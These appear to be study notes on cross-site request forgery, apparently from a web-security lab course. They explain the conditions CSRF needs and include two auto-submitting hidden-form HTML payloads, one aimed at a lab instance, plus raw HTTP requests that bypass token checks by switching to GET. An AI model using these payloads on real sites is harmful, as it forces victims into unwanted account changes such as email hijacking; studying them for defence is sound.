                                                  ## What is CSRF?
# Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
# It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. 
# In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally.
# For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. 


                                                ## What is the impact of a CSRF attack?
# In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. 
#  For example, this might be to change the email address on their account, to change their password, or to make a funds transfer.

                                           ## How does CSRF work?
# A relevant action.
-------> There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password). 

# Cookie-based session handling.
--------> Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests.
--------> There is no other mechanism in place for tracking sessions or validating user requests. 

# No unpredictable request parameters.
---------> The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess.
---------> For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password. 


                                            <html>
                                                <body>
                                                <h1>Hello World</h1>
                                                <iframe style="display:none" name="csrf-iframe"></iframe>
                                                    <form action="https://vulnerable-website.com/email/change" method="POST" target="csrf-iframe" id="csrf-form">
                                                        <input type="hidden" name="email" value="pwned@evil-user.net"/>
                                                    </form>
                                                    <script>
                                                        document.forms[0].submit();
                                                    </script>
                                                </body>
                                            </html>
                                            
                                            
                                            
                                           <html>
                                              <body>
                                              <h1>Hello World</h1>
                                              <iframe style="display:none" name="csrf-iframe"></iframe>
                                                  <form action="https://0af1001404f9a5cec0cc0650006c006b.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf.form">
                                                      <input type="hidden" name="email" value="suleshyjr@user.net"/>
                                                  </form>


                                                  <script>document.getElementById('csrf.form').submit()</script>
                                              </body>
                                          </html>
                                          
                                          
 #  If a victim user visits the attacker's web page, the following will happen: 
 
 ------> The attacker's page will trigger an HTTP request to the vulnerable web site. 
 -------> If the user is logged in to the vulnerable web site, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used). 
 --------> The vulnerable web site will process the request in the normal way, treat it as having been made by the victim user, and change their email address. 
 
 
                                               ## Common CSRF vulnerabilities
                                               
# In the previous example, suppose that the application now includes a CSRF token within the request to change the user's e-mail: 

                                        POST /email/change HTTP/1.1
                                        Host: vulnerable-website.com
                                        Content-Type: application/x-www-form-urlencoded
                                        Content-Length: 68
                                        Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

                                        csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com
                                        
# The application no longer relies solely on cookies for session handling, and the request contains a parameter whose value an attacker cannot determine. 
# However, there are various ways in which the defense can be broken, meaning that the application is still vulnerable to CSRF. 

                                      ## Validation of CSRF token depends on request method
# Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used. 
# In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack: 


                                          GET /email/change?email=pwned@evil-user.net HTTP/1.1
                                          Host: vulnerable-website.com
                                          Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
                                      
# 
 
 
 
 
